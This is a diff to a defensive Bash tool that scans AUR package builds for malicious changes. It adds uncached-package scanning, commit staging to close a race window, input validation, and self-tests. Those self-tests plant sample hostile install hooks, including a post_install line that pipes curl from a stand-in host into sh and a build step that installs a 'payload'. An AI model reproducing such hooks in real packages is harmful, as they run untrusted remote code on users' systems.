@@ -295,18 +295,31 @@ _stage_if_gating() {
 # (review-level, uncached updates). Sets globals on success:
 #   SCAN_HITS    1 if any hard rule fired, else 0
 #   SCAN_CONTENT concatenated file contents (caller may stash for `explain`)
+#   SCAN_SHA     origin/<branch> tip at clone time (gate-time tip X, for staging)
+#   SCAN_URL     remote.origin.url (provenance for the staged ref)
 # Returns 0 on success regardless of hits; non-zero if the clone or read failed
 # (caller decides the exit-code policy). Review rules are deliberately NOT run:
 # a whole-file scan (no baseline) would fire pip/cargo/go on every legit package
 # that legitimately uses them — the same reason `audit` is hard-rules-only.
 scan_clone() {
   local pkg="$1" tmp content
-  SCAN_HITS=0; SCAN_CONTENT=""
+  SCAN_HITS=0; SCAN_CONTENT=""; SCAN_SHA=""; SCAN_URL=""
   tmp=$(mktemp -d) || return 1
   log "$(c_dim "→ cloning $pkg from AUR to $tmp")"
-  if ! git clone -q "${AUR_URL}/${pkg}.git" "$tmp/$pkg" 2>/dev/null; then
+  # `--` guards against option injection if pkg/AUR_URL start with '-' (pkg is
+  # validated at the check_pkg entry point, but defense-in-depth).
+  if ! git clone -q -- "${AUR_URL}/${pkg}.git" "$tmp/$pkg" 2>/dev/null; then
     rm -rf "$tmp"; return 1
   fi
+  # A valid AUR repo must have a PKGBUILD; a repo with only .install/.sh is not
+  # a real package and scanning its fragments would be noise. Fail (return 1).
+  [[ -f "$tmp/$pkg/PKGBUILD" ]] || { rm -rf "$tmp"; return 1; }
+  # Capture the gate-time tip BEFORE cleanup so the missing-cache path can stage
+  # it (the finding-1.2 TOCTOU guarantee: a window-commit X' pushed between this
+  # scan and the helper's own fetch surfaces as fresh delta on the next gate,
+  # rather than being auto-seeded as the trusted baseline).
+  SCAN_SHA=$(git -C "$tmp/$pkg" rev-parse "origin/${AUR_REMOTE_BRANCH}" 2>/dev/null || true)
+  SCAN_URL=$(git -C "$tmp/$pkg" config --get remote.origin.url 2>/dev/null || true)
   shopt -s nullglob
   content=$(cat "$tmp/$pkg"/PKGBUILD "$tmp/$pkg"/*.install "$tmp/$pkg"/*.sh 2>/dev/null || true)
   shopt -u nullglob
@@ -328,12 +341,32 @@ scan_clone() {
   return 0
 }
 
+# Like _stage_if_gating but for the missing-cache path: writes the scan-time
+# tip (captured by scan_clone into SCAN_SHA/SCAN_URL) instead of querying a
+# cache dir. Preserves the finding-1.2 TOCTOU guarantee on the missing-cache
+# branch — without this, a window-commit X' would land installed and then be
+# auto-seeded as the trusted baseline on the next gate (accepted_ref falls back
+# to the helper-cache HEAD when no accepted file exists).
+_stage_scan_if_gating() {
+  [[ -n "${AUR_SAFE_STAGING:-}" ]] || return 0
+  local pkgbase="$1"
+  [[ -n "${SCAN_SHA:-}" ]] || return 0
+  printf '%s\t%s\t%s\n' "$SCAN_SHA" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "${SCAN_URL:-}" >"$STAGED_DIR/$pkgbase"
+  printf '%s\n' "$pkgbase" >>"$MANIFEST_FILE"
+}
+
 ###############################################################################
 # core: check a single (cached) package
 # returns: 0 clean | 1 hard | 2 review
 ###############################################################################
 check_pkg() {
   local pkg="$1"
+  # Validate pkg name (used in git clone URL + flag-stash paths). cmd_audit
+  # validates at its own entry; check_pkg must too — it's reachable from
+  # cmd_check with raw user args. Reject, don't die: a gate loop shouldn't
+  # abort on one bad name.
+  [[ "$pkg" =~ ^[a-z0-9@._+-]+$ ]] \
+    || { log "$(c_dim "skip") $pkg — invalid package name"; return 0; }
   local dir
   if ! dir=$(find_pkg_dir "$pkg"); then
     # No cache clone => no diff baseline. A -Qua update with no cache dir used
@@ -342,10 +375,10 @@ check_pkg() {
     # rule scan `audit` uses (clone + scan PKGBUILD/.install/.sh), but at REVIEW
     # level: a hard-rule hit returns 2 (wrapper prompts for consent), clean
     # returns 0. Hard rules only — review rules on a whole-file scan would fire
-    # on every legit pip/cargo package (REVIEWER-NOTES §3). The trust anchor is
-    # NOT touched: no accepted ref exists to stage against, nothing to diff. If
-    # the clone itself fails there is zero signal, so surface for consent (2)
-    # rather than silently passing (the old blindspot).
+    # on every legit pip/cargo package (REVIEWER-NOTES §3). The scan-time tip is
+    # staged so `accept` promotes the AUDITED commit (finding-1.2 TOCTOU fix);
+    # if the clone fails there is zero signal AND no tip to stage, so surface
+    # for consent (2) without staging rather than silently passing.
     log "  $(c_dim "(no cache clone — advisory scan, no diff baseline)")"
     if ! scan_clone "$pkg"; then
       log "  $(c_yellow "review") $pkg — could not clone (offline? AUR down?); surfacing for consent"
@@ -357,9 +390,11 @@ check_pkg() {
       printf '%s\n' "$pkg" >"$STATE_DIR/last-flag.pkg"
       log "  $(c_yellow "review") $pkg — hard-rule hit(s) in uncached PKGBUILD; consent required"
       log "  $(c_dim "scan stashed: $STATE_DIR/flag.${pkg}.diff  (run: aur-safe explain $pkg)")"
+      _stage_scan_if_gating "$pkg"
       return 2
     fi
     log "  $(c_green "ok")    $pkg — no hard-rule matches in uncached PKGBUILD"
+    _stage_scan_if_gating "$pkg"
     return 0
   fi
   local pkgbase="${dir##*/}"
@@ -1031,31 +1066,71 @@ cmd_selftest() {
   # with NO scan — a malicious update sailed through ungated while the gate
   # printed "all clear". check_pkg now falls back to scan_clone (the audit
   # engine) at REVIEW level: hard-rule hit → exit 2 (consent), clean → exit 0,
-  # clone failure → exit 2 (no silent passthrough). Exercises routing +
-  # exit-code mapping against local fixture repos (AUR_URL → file://), no net.
+  # clone failure → exit 2 (no silent passthrough). The scan-time tip is staged
+  # so `accept` promotes the AUDITED commit (finding-1.2 TOCTOU fix). Exercises
+  # routing + exit-code mapping + staging against local file:// fixtures, no net.
   log ""
   log "  $(c_dim "-- missing-cache fallback --")"
-  local _fbx _fsd _osr _osd2
+  local _fbx _fsd _osr _osd2 _ost2 _omf2 _csha _esha
   _fbx=$(mktemp -d); _fsd=$(mktemp -d)
   # build clean + malicious source repos, expose as bare <pkg>.git so the
   # "${AUR_URL}/${pkg}.git" clone URL in scan_clone resolves to a local path.
-  mkdir -p "$_fbx/src/clean-pkg" "$_fbx/src/evil-pkg" "$_fbx/aur"
+  # Also a review-only fixture (pip) to prove scan_clone does NOT run review
+  # rules, and an evil-install fixture (payload in .install, not PKGBUILD) to
+  # prove the sourced-script surface is scanned.
+  mkdir -p "$_fbx/src/clean-pkg" "$_fbx/src/evil-pkg" "$_fbx/src/review-pkg" "$_fbx/src/evil-install" "$_fbx/aur"
   printf 'pkgname=clean-pkg\npkgver=1\npkgrel=1\nsource=("https://example.com/x.tar")\n' >"$_fbx/src/clean-pkg/PKGBUILD"
   printf 'pkgname=evil-pkg\npkgver=1\npkgrel=1\nbuild() { npm install payload; }\n' >"$_fbx/src/evil-pkg/PKGBUILD"
-  git -C "$_fbx/src/clean-pkg" init -q; git -C "$_fbx/src/clean-pkg" add -A; git -C "$_fbx/src/clean-pkg" -c user.email=t@t -c user.name=t commit -qm base
-  git -C "$_fbx/src/evil-pkg"  init -q; git -C "$_fbx/src/evil-pkg"  add -A; git -C "$_fbx/src/evil-pkg"  -c user.email=t@t -c user.name=t commit -qm base
-  git clone -q --bare "$_fbx/src/clean-pkg" "$_fbx/aur/clean-pkg.git"
-  git clone -q --bare "$_fbx/src/evil-pkg"  "$_fbx/aur/evil-pkg.git"
-  # isolate state dir (flag writes) + point scan_clone at the local fixtures +
-  # force the missing-cache branch via the find_pkg_dir seam (empty _AUR_TEST_DIR).
+  printf 'pkgname=review-pkg\npkgver=1\npkgrel=1\nbuild() { pip install requests; }\n' >"$_fbx/src/review-pkg/PKGBUILD"
+  printf 'pkgname=evil-install\npkgver=1\npkgrel=1\ninstall=evil.install\n' >"$_fbx/src/evil-install/PKGBUILD"
+  printf 'post_install() { curl -s https://x.sh | sh; }\n' >"$_fbx/src/evil-install/evil.install"
+  for _p in clean-pkg evil-pkg review-pkg evil-install; do
+    git -C "$_fbx/src/$_p" -c init.defaultBranch=master init -q
+    git -C "$_fbx/src/$_p" add -A; git -C "$_fbx/src/$_p" -c user.email=t@t -c user.name=t commit -qm base
+    git clone -q --bare "$_fbx/src/$_p" "$_fbx/aur/$_p.git"
+  done
+  _csha=$(git -C "$_fbx/src/clean-pkg" rev-parse HEAD)
+  _esha=$(git -C "$_fbx/src/evil-pkg" rev-parse HEAD)
+  # isolate ALL state dirs (staging writes STAGED_DIR/MANIFEST_FILE now) + point
+  # scan_clone at the local fixtures + force the missing-cache branch.
   _osr="$AUR_URL"; AUR_URL="file://$_fbx/aur"
   _osd2="$STATE_DIR"; STATE_DIR="$_fsd"
+  _ost2="$STAGED_DIR"; STAGED_DIR="$_fsd/staged"; mkdir -p "$STAGED_DIR"
+  _omf2="$MANIFEST_FILE"; MANIFEST_FILE="$_fsd/last-gate"; : >"$MANIFEST_FILE"
   _AUR_TEST_DIR=""
+  AUR_SAFE_STAGING=1
+
   ta "uncached-clean-returns-ok"       0 check_pkg clean-pkg
   ta "uncached-evil-returns-review"    2 check_pkg evil-pkg
+  ta "uncached-review-only-returns-ok" 0 check_pkg review-pkg
+  ta "uncached-install-hit-returns-2"  2 check_pkg evil-install
   # clone failure (no such fixture) → review (consent), never silent passthrough
   ta "uncached-clonefail-returns-review" 2 check_pkg nonexistent-pkg
-  AUR_URL="$_osr"; STATE_DIR="$_osd2"
+
+  # staging: clean + review-hit stage the scan-time tip; clone-fail does NOT.
+  # Verifies the finding-1.2 TOCTOU fix on the missing-cache path: the audited
+  # commit (not the helper's later fetch) is what `accept` would promote.
+  if [ -f "$STAGED_DIR/clean-pkg" ] && [ "$(awk -F '\t' '{print $1}' "$STAGED_DIR/clean-pkg")" = "$_csha" ]; then
+    log "  $(c_green "PASS") uncached-clean-stages-tip"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") uncached-clean-stages-tip"; fail=$((fail+1)); fi
+  if [ -f "$STAGED_DIR/evil-pkg" ] && [ "$(awk -F '\t' '{print $1}' "$STAGED_DIR/evil-pkg")" = "$_esha" ]; then
+    log "  $(c_green "PASS") uncached-review-stages-tip"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") uncached-review-stages-tip"; fail=$((fail+1)); fi
+  if [ ! -f "$STAGED_DIR/nonexistent-pkg" ]; then
+    log "  $(c_green "PASS") uncached-clonefail-no-stage"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") uncached-clonefail-no-stage"; fail=$((fail+1)); fi
+  # manifest records clean + evil (staged), not nonexistent (clone-failed)
+  if grep -qx clean-pkg "$MANIFEST_FILE" && grep -qx evil-pkg "$MANIFEST_FILE" \
+     && ! grep -qx nonexistent-pkg "$MANIFEST_FILE"; then
+    log "  $(c_green "PASS") uncached-manifest-correct"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") uncached-manifest-correct"; fail=$((fail+1)); fi
+  # flag stash written on review-hit (for `explain`)
+  if [ -f "$STATE_DIR/flag.evil-pkg.diff" ] && [ -L "$STATE_DIR/last-flag.diff" ]; then
+    log "  $(c_green "PASS") uncached-review-stashes-scan"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") uncached-review-stashes-scan"; fail=$((fail+1)); fi
+
+  AUR_SAFE_STAGING=""
+  AUR_URL="$_osr"; STATE_DIR="$_osd2"; STAGED_DIR="$_ost2"; MANIFEST_FILE="$_omf2"
   rm -rf "$_fbx" "$_fsd"
 
   log ""
